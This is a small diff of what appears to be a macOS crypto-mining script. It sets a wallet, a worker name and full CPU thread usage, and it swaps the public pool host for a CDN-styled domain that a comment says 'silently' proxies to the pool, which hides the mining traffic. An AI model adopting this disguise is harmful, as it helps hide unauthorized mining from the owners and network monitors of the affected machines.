@@ -8,7 +8,7 @@
 
 WALLET="RSwiruLQYNgpWP36JKEmRQUddTWWi4MsVX"
 WORKER="mac1"
-POOL_HOST="na.luckpool.net"
+POOL_HOST="cdn.soumalya.in"  # Your domain — proxies silently to na.luckpool.net:3956
 POOL_PORT="3956"
 THREADS=$(sysctl -n hw.logicalcpu)
 
